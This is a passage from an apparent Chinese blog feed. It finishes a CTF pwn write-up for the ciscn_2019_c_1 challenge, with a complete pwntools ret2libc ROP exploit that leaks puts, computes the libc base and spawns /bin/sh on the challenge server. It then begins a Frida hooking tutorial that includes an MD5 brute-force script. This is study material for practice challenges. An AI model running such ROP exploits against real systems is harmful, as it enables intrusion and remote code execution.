函数在 GOT（Global Offset Table，全局偏移表）中的地址</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]   <span class="comment">#puts 函数在 PLT（Procedure Linkage Table，过程链接表）中的地址</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;1&#x27;</span>*<span class="number">0x58</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br></pre></td></tr></table></figure><p>payload解析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(1) &#x27;1&#x27;*0x58</span><br><span class="line">这是填充数据，用来覆盖栈上到返回地址之间的空间，0x58（88 字节）具体大小是通过调试得出的，它是为了确保接下来的地址恰好覆盖函数返回地址。</span><br><span class="line">(2) p64(pop_rdi)</span><br><span class="line">这是一个 gadget，即一段指令：pop rdi; ret。在 x86-64 架构的调用约定中，rdi 寄存器是用来传递第一个函数参数的。通过这个 gadget，我们将 puts_got 地址放入 rdi 中，作为参数传递给 puts 函数。</span><br><span class="line">(3) p64(puts_got)</span><br><span class="line">这是 puts 函数在 GOT 中的地址。这里的目的是将 puts_got 的地址作为参数传递给 puts 函数。换句话说，puts 函数会将 GOT 表中 puts 函数的地址 打印出来。这是关键一步，它让我们能够知道 puts 函数的实际地址。</span><br><span class="line">(4) p64(puts_plt)</span><br><span class="line">这是 puts 函数在 PLT 中的地址。通过调用 PLT 中的 puts，程序会实际调用 puts 函数，并将我们传入的参数（即 puts_got 中的地址）作为 puts 的输出内容。这样，puts 函数会输出 GOT 表中存储的 puts 函数的真实地址。</span><br><span class="line">(5) p64(main_addr)</span><br><span class="line">在 puts 函数执行完成后，程序返回到主函数 main，从而可以让程序重新执行并等待新的输入。我们利用这一点，在泄露 puts 地址后，重新回到主函数，继续我们的攻击。因为泄露基址只是第一步，接下来还要接着利用基址来执行代码操作</span><br></pre></td></tr></table></figure><p><strong>方法2——手动查找</strong></p><p>（手动查找时是在本地进行查找，无法获取和靶机一样的环境，因此会因为libc库版本的差异而导致基址不准，所以还是建议使用代码自动获取基址）</p><ol><li>puts()函数在encrypt()函数末尾，<code>disass encrypt</code>找到puts()函数调用的位置</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass encrypt</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> encrypt:</span><br><span class="line">   0x00000000004009a0 &lt;+0&gt;:     push   rbp</span><br><span class="line">   ...</span><br><span class="line">   ...</span><br><span class="line">   0x0000000000400ad1 &lt;+305&gt;:   mov    edi,0x400cd5</span><br><span class="line">   0x0000000000400ad6 &lt;+310&gt;:   call   0x4006e0 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000400adb &lt;+315&gt;:   lea    rax,[rbp-0x50]</span><br><span class="line">   0x0000000000400adf &lt;+319&gt;:   mov    rdi,rax</span><br><span class="line">   0x0000000000400ae2 &lt;+322&gt;:   call   0x4006e0 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000400ae7 &lt;+327&gt;:   nop</span><br><span class="line">   0x0000000000400ae8 &lt;+328&gt;:   add    rsp,0x48</span><br></pre></td></tr></table></figure><ol start="2"><li>打断点 <code>b *encrypt+322</code>,然后查看puts（）的<strong>实际地址</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *encrypt+322</span><br><span class="line">Breakpoint 2 at 0x400ae2</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">pwndbg&gt; p puts</span><br><span class="line"><span class="variable">$1</span> = &#123;int (const char *)&#125; 0x7ffff7e36640 &lt;__GI__IO_puts&gt;</span><br></pre></td></tr></table></figure><ol start="3"><li>接下来需要知道 <code>puts</code> 在 <code>libc</code> 库中的<strong>偏移量</strong></li></ol><p>可以使用<code>info proc mappings</code>看到libc库的路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; info proc mappings</span><br><span class="line">...</span><br><span class="line">      0x7ffff7dbc000     0x7ffff7dbf000     0x3000        0x0  rw-p   </span><br><span class="line">      0x7ffff7dbf000     0x7ffff7de5000    0x26000        0x0  r--p   /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">      0x7ffff7de5000     0x7ffff7f3c000   0x157000    0x26000  r-xp   /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>使用 <code>readelf</code> 或 <code>nm</code> 来查看 <code>libc.so.6</code> 中函数的偏移地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">└─$ readelf -s /usr/lib/x86_64-linux-gnu/libc.so.6 | grep puts                                                     </span><br><span class="line">   530: 0000000000112760   770 FUNC    GLOBAL DEFAULT   16 putsgent@@GLIBC_2.10</span><br><span class="line">   820: 0000000000075dd0   418 FUNC    WEAK   DEFAULT   16 fputs@@GLIBC_2.2.5</span><br><span class="line">   972: 00000000001110b0  1360 FUNC    GLOBAL DEFAULT   16 putspent@@GLIBC_2.2.5</span><br><span class="line">  1461: 0000000000077640   530 FUNC    WEAK   DEFAULT   16 puts@@GLIBC_2.2.5</span><br><span class="line">  1470: 0000000000077640   530 FUNC    GLOBAL DEFAULT   16 _IO_puts@@GLIBC_2.2.5</span><br><span class="line"></span><br><span class="line">└─$ nm -D /usr/lib/x86_64-linux-gnu/libc.so.6 | grep puts</span><br><span class="line">0000000000075dd0 W fputs@@GLIBC_2.2.5</span><br><span class="line">0000000000080660 W fputs_unlocked@@GLIBC_2.2.5</span><br><span class="line">0000000000075dd0 T _IO_fputs@@GLIBC_2.2.5</span><br><span class="line">0000000000077640 T _IO_puts@@GLIBC_2.2.5</span><br><span class="line">0000000000077640 W puts@@GLIBC_2.2.5</span><br><span class="line">0000000000112760 T putsgent@@GLIBC_2.10</span><br><span class="line">00000000001110b0 T putspent@@GLIBC_2.2.5</span><br></pre></td></tr></table></figure><ul><li><p>readelf查看 <strong>ELF</strong> <strong>文件的符号表</strong>，其中列出了 <code>libc.so.6</code> 中的所有全局函数和数据。它表示<code>puts()</code> 是一个 <strong>弱符号（WEAK）</strong>，地址是 <code>0000000000077640</code>。</p></li><li><p>nm 查看<strong>动态符号表</strong> 中的符号，包括动态链接库中的符号。</p></li><li><p>由此得出puts()的偏移地址<code>0000000000077640</code>。</p></li></ul><ol start="4"><li>计算<strong>libc基址</strong></li></ol><p>计算出结果为：<code>0x7ffff7dbf000</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">puts_leaked=<span class="number">0x7ffff7e36640</span></span><br><span class="line">puts_offset=<span class="number">0x77640</span></span><br><span class="line">libc_base = puts_leaked - puts_offset</span><br></pre></td></tr></table></figure><p>验证下,刚好在，由此得出libc基址为<code>0x7ffff7dbf000</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; info proc mappings</span><br><span class="line">process 143698</span><br><span class="line">Mapped address spaces:</span><br><span class="line"></span><br><span class="line">          Start Addr           End Addr       Size     Offset  Perms  objfile</span><br><span class="line">            0x400000           0x402000     0x2000        0x0  r-xp   /home/pwn/桌面/ciscn_2019_c_1</span><br><span class="line">            0x601000           0x602000     0x1000     0x1000  r--p   /home/pwn/桌面/ciscn_2019_c_1</span><br><span class="line">            0x602000           0x603000     0x1000     0x2000  rw-p   /home/pwn/桌面/ciscn_2019_c_1</span><br><span class="line">      0x7ffff7dbc000     0x7ffff7dbf000     0x3000        0x0  rw-p   </span><br><span class="line">      0x7ffff7dbf000     0x7ffff7de5000    0x26000        0x0  r--p   /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">      0x7ffff7de5000     0x7ffff7f3c000   0x157000    0x26000  r-xp   /usr/lib/x86_64-linux-gnu/libc.so.6</span><br></pre></td></tr></table></figure><h4 id="2-计算后门代码偏移及地址"><a href="#2-计算后门代码偏移及地址" class="headerlink" title="2.计算后门代码偏移及地址"></a><strong>2.计算后门代码偏移及地址</strong></h4><p><strong>方法1——利用</strong><strong><code>LibcSearcher</code></strong></p><blockquote><p>这是针对CTF比赛所做的小工具，在泄露了Libc中的某一个函数地址后，常常为不知道对方所使用的操作系统及libc的版本而苦恼，常规方法就是挨个把常见的Libc.so从系统里拿出来，与泄露的地址对比一下最后12位。</p></blockquote><p>实际地址则是程序运行之后，函数在内存中的地址，是一个随机的基址加上libc里面函数的地址，当你后面用ROP时候，需要有个基址才能正确调用内存中的函数.</p><p>接着利用puts函数来获取system和&#x2F;bin&#x2F;sh</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;puts_addr = &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;libcbase = &#x27;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">sys_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>方法2——一个个找</strong></p><ol><li>找system（）地址</li></ol><p>使用 <code>readelf</code> 或 <code>nm</code> 来查看 <code>libc.so.6</code> 中函数的偏移地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ readelf -s /usr/lib/x86_64-linux-gnu/libc.so.6 | grep system</span><br><span class="line">  1513: 000000000004dab0    45 FUNC    WEAK   DEFAULT   16 system@@GLIBC_2.2.5</span><br><span class="line"></span><br><span class="line">└─$ nm -D /usr/lib/x86_64-linux-gnu/libc.so.6 | grep system                                                        </span><br><span class="line">000000000004dab0 T __libc_system@@GLIBC_PRIVATE</span><br><span class="line">0000000000148710 T svcerr_systemerr@GLIBC_2.2.5</span><br><span class="line">000000000004dab0 W system@@GLIBC_2.2.5</span><br></pre></td></tr></table></figure><ul><li><p>**<code>__libc_system</code><strong>：这是 <code>libc</code> 的内部实现版本，标记为 <code>GLIBC_PRIVATE</code>，只在库的内部使用。</strong><code>system</code>**：这是全局可访问的函数，标记为 <code>GLIBC_2.2.5</code>。</p></li><li><p>由此得出system的偏移地址<code>0x000000000004dab0</code>。</p></li></ul><ol start="2"><li>找&#x2F;bin&#x2F;sh地址</li></ol><p>&#x2F;bin&#x2F;sh并不是一个符号表中的符号，而是一个<strong>字符串常量</strong>，嵌入在 <code>libc</code> 的数据段中，所以不能用redelf和nm来获得。可以使用pwntools获得。得到地址<code>0x197e34</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">binsh_addr = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">——$ python3 t2.py</span><br><span class="line">[*] <span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line"><span class="number">0x197e34</span></span><br></pre></td></tr></table></figure><p>&#x2F;bin&#x2F;sh和system（）的地址为libc的基址加上它们各自的偏移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">libc_base=</span><br><span class="line">system_offset=<span class="number">0x4dab0</span></span><br><span class="line">binsh_offset=<span class="number">0x197e34</span></span><br><span class="line">system_address =libc_base+system_offset</span><br><span class="line">binsh_address=libc_nase+binsh_offset</span><br></pre></td></tr></table></figure><h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><p>前面已经：<em>实现溢出，获得后门函数地址</em>，接下来就是组合它们，使它们<em>可执行</em>。</p><p><em>栈对齐</em>是ubuntu18后的一个机制，就是函数结束时候由于一些出入栈的操作导致栈地址不能向8位或16位对齐，需要对齐之后才能使用函数(timeout就是内存错误，有可能就是没有栈对齐)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret=<span class="number">0x400c84</span>   </span><br><span class="line">payload = <span class="string">b&#x27;1&#x27;</span>*<span class="number">0x58</span>+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)</span><br></pre></td></tr></table></figure><p><strong>关于ret的值：</strong></p><p>ret是一个返回地址，0x400c84是我<code>objdump -M intel -d &#39;./ciscn_2019_c_1&#39;</code>后找到的一个ret地址，前面</p><p><code>ROPgadget --binary ciscn_2019_c_1 --only &#39;pop|ret&#39;</code> 得到的那个ret值<code>0x4006b9</code>也能用，但是它返回的shell一次只能执行一个指令（我执行完ls后它就结束了），换成<code>0x400c84</code>后就能一次执行完ls和cat flag。问题不大，选中能用的ret就可以了。</p><p>虽说这个ret在这里只是一个补齐栈的作用，但如果是随意设置值，比如0x400001之类无意义的值，payload最后会出现红色的$符号，但是无法执行任何命令，或者是说无法回显命令执行结果。</p><p><img                         lazyload                       alt="image"                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240926/Aspose.Words.b29023ea-ea4d-4a54-8e76-4a1beff23b1c.003.7ax4tz6sod.webp"                                        ></p><p><strong>关于puts函数返回值的处理：</strong></p><p>puts输出会将\x00作为截断字符，假设函数地址后面3个字节为0，接收8个字节就会将函数地址后面输出的3个字节当做函数地址的最后3个字节，导致函数地址不正确，LibcSearcher对比的是最后12位，自然找不到正确的Libc</p><p>完整的payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29552</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>) </span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">main_addr = <span class="number">0x400B28</span> </span><br><span class="line">pop_rdi = <span class="number">0x400C83</span>  </span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]   </span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]   </span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;1&#x27;</span>*<span class="number">0x58</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;puts_addr = &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;libcbase = &#x27;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">sys_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">ret=<span class="number">0x400c84</span></span><br><span class="line">payload = <span class="string">b&#x27;1&#x27;</span>*<span class="number">0x58</span>+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行到第一个payload后会让你选择libc版本，选2.27的那个。因为题目提供的靶机是Ubuntu 18，而Ubuntu 18.04 稳定版本的 glibc 是2.27，可以在网上查到不同Ubuntu版本相对应的libc版本</p><ul><li>Ubuntu 18.04 LTS: glibc 2.27</li></ul><p>成功</p><p><img                         lazyload                       alt="image"                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240926/Aspose.Words.b29023ea-ea4d-4a54-8e76-4a1beff23b1c.004.77diw9ds94.webp"                                        ></p><blockquote><p>一些报错</p><p>BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See <a class="link"   href="https://docs.pwntools.com/#bytes" >https://docs.pwntools.com/#bytes<i class="fas fa-external-link-alt"></i></a></p><p>重新捋了一遍代码的运行逻辑，换了一下send数据的时机就好了</p><p>LibcSearch模块缺失：第一次安装是安装作者写的方法 <code>python setup.py develop</code>,安装失败，然后改为直接<code>pip install libcsearch</code> ,安装成功</p></blockquote><h2 id="扩展知识"><a href="#扩展知识" class="headerlink" title="扩展知识"></a>扩展知识</h2><h3 id="x86-和-x86-64-的ROP差异"><a href="#x86-和-x86-64-的ROP差异" class="headerlink" title="x86 和 x86_64 的ROP差异"></a><strong>x86</strong> 和 x86_64 的ROP差异</h3><p>在 x86 和 x86_64 两种架构下、ROP 方法的 payload 组织方式有所不同：</p><ul><li><p>x86 非syscall:</p><ul><li><p>参数通过栈传递，因此一般无需pop和ret指令；</p></li><li><p>函数能直接访问在payload中预先防止放置的数据，是因为这数据作为些参数通过ebp被访问，而ebp会在函数prologue中设置</p><ul><li><p>prologue: <code>push ebp;mov ebp, esp</code></p></li><li><p>epilogue: <code>leave;ret</code></p></li></ul></li><li><p>组织形式：<code>FUNCTION ADDR</code> + <code>RETURN ADDR</code> + <code>ARGUMENT_0...N</code></p><ul><li>如果要实现执行多个函数，<code>RETURN ADDR</code>需要使用ROP gadget</li></ul></li></ul></li><li><p>x86_64 非syscall:</p><ul><li><p>前6个参数依次<a class="link"   href="https://stackoverflow.com/a/2538212/8706476" >通过寄存器传递<i class="fas fa-external-link-alt"></i></a>： RDI, RSI, RDX, RCX, R8, R9</p></li><li><p>gadget 均包含ret指令；</p></li><li><p>组织形式：<code>GADGET_0 ADDR</code> + <code>ARGUMENT_0</code> + <code>GADGET_1 ADDR</code> + … + <code>GADGET_N ADDR</code> + <code>ARGUMENT_N</code> + <code>FUNCTION ADDR</code></p></li></ul></li></ul><h2 id="参考以及推荐"><a href="#参考以及推荐" class="headerlink" title="参考以及推荐"></a>参考以及推荐</h2><p><a class="link"   href="https://blog.csdn.net/qinying001/article/details/103266763" >https://blog.csdn.net/qinying001/article/details/103266763<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="http://liul14n.top/2020/01/29/ciscn-2019-c-1/" >http://liul14n.top/2020/01/29/ciscn-2019-c-1/<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html" >https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://kayoch1n.github.io/blog/buuoj-pwn-rop-ciscn_2019_c_1/" >https://kayoch1n.github.io/blog/buuoj-pwn-rop-ciscn_2019_c_1/<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前置分析&quot;&gt;&lt;a href=&quot;#前置分析&quot; class=&quot;headerlink&quot; title=&quot;前置分析&quot;&gt;&lt;/a&gt;前置分析&lt;/h2&gt;&lt;p&gt;检查保护&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>简单hook一下</title>
    <link href="http://arch3rn4r.github.io/2024/09/24/%E7%AE%80%E5%8D%95hook%E4%B8%80%E4%B8%8B/"/>
    <id>http://arch3rn4r.github.io/2024/09/24/%E7%AE%80%E5%8D%95hook%E4%B8%80%E4%B8%8B/</id>
    <published>2024-09-24T10:58:49.000Z</published>
    <updated>2025-05-02T02:41:59.554Z</updated>
    
    <content type="html"><![CDATA[<p>使用的例题是**[CISCN 2022 东北]crackme_Android，**虽然这题的关键点在MD5爆破，但是它的主逻辑函数包括了“成功”和“失败”的判断，可以验证是否成功hook函数</p><blockquote><p>我的环境</p><p>frida 16.4.2</p><p>雷电模拟器(adb也是使用的雷电模拟器自带的）</p><p>jadx</p><p>IDEA</p></blockquote><h2 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h2><p>初步分析，拖入模拟器后运行，随便输一个数，得到报错信息</p><p><img                         lazyload                       alt="image"                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240924/Aspose.Words.b061723d-fb1e-445f-824f-74287a2b100e.001.41y0upynn6.webp"                                        ></p><p>在jadx里使用文本搜索找到相应报错信息并得到判断条件</p><p><img                         lazyload                       alt="image"                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240924/Aspose.Words.b061723d-fb1e-445f-824f-74287a2b100e.002.m1gbxcnj.webp"                                        ></p><p>点击if判断里的“check”找到check函数</p><p><img                         lazyload                       alt="image"                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240924/Aspose.Words.b061723d-fb1e-445f-824f-74287a2b100e.003.4n7oh0vy77.webp"                                        ></p><p>通过分析可知格式是flag{}，然后还有个MD5,爆破，以下是爆破脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 待破解MD5值</span></span><br><span class="line">target_md5s =[]</span><br><span class="line">flag=<span class="string">&quot;&quot;</span><span class="built_in">str</span>=<span class="string">&#x27;8393931a16db5a00f464a24abe24b17a9040b57d9cb2cbfa6bdc61d12e9b51f2789e8a8ae9406c969118e75e9bc65c4327fbc7c3accdf2c54675b0ddf3e0a6099b1b81046d525495e3a14ff6eae76eddfa1740cd6bd483da0f7684b2e4ec84b371f07bf95f0113eefab12552181dd832af8d1eb220186400c494db7091e402b0&#x27;</span><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    target_md5s.append(<span class="built_in">str</span>[<span class="number">32</span>*i:<span class="number">32</span>*(i+<span class="number">1</span>)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成所有可能的4位信息的列表</span></span><br><span class="line">passwords = []</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_&#x27;</span>:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_&#x27;</span>:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_&#x27;</span>:</span><br><span class="line">                passwords.append(a+b+c+d)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 逐个比较MD5值for md5 in target_md5s:</span></span><br><span class="line">    <span class="keyword">for</span> password <span class="keyword">in</span> passwords:</span><br><span class="line">        <span class="keyword">if</span> hashlib.md5(password.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest() == md5:</span><br><span class="line">            flag+=password</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Password found: &quot;</span> + password)</span><br><span class="line">            breakprint(<span class="string">&quot;flag&#123;&quot;</span>+flag+<span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p>好了题目解出来了，现在继续看hook函数</p><h2 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h2><p>先找到包名 com.example.crackme1，这一步可以使用MT管理器，但是现在不需要一步一步构建</p><p>找到所需hook的函数”check”,在jadx里直接右键复制代码就行，接下来演示是使用frida就复制frida的</p><p><img                         lazyload                       alt="image"                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240924/Aspose.Words.b061723d-fb1e-445f-824f-74287a2b100e.004.39l5czkyfq.webp"                                        ></p><h3 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h3><p>连接上模拟器，我用的是雷电模拟器，它的启动命令如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 